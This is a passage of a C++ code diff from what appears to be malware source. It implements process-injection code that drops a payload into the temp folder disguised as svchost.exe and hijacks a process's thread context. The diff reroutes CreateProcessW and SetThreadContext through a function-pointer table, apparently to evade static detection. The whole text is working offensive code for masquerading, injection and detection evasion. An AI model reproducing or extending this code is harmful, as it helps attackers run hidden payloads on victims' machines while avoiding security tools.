@@ -8,7 +8,7 @@ namespace Technique::Injection
     ) {
         // Set the temp file path
         std::wstring wExeFileName = L"svchost.exe"; // Impersonate the file name.
-        std::wstring wExePath = System::Env::GetStrings(L"%TEMP%") + L"\\" + wExeFileName;
+        std::wstring wExePath = System::Env::GetStrings(pProcs, L"%TEMP%") + L"\\" + wExeFileName;
 
         // Write PE file
         if (!System::Fs::FileWrite(pProcs, wExePath, bytes))
@@ -35,7 +35,7 @@ namespace Technique::Injection
         LPSTARTUPINFOW lpStartupInfo = new STARTUPINFOW();
         PROCESS_INFORMATION pi;
 
-        if (!CreateProcessW(
+        if (!pProcs->lpCreateProcessW(
             nullptr,
             const_cast<LPWSTR>(wTargetProcess.c_str()),
             nullptr,
@@ -305,7 +305,7 @@ namespace Technique::Injection
         //     delete lpCtx;
         //     return FALSE;
         // }
-        if (!SetThreadContext(hDestThread, lpCtx))
+        if (!pProcs->lpSetThreadContext(hDestThread, lpCtx))
         {
             delete lpCtx;
             return FALSE;
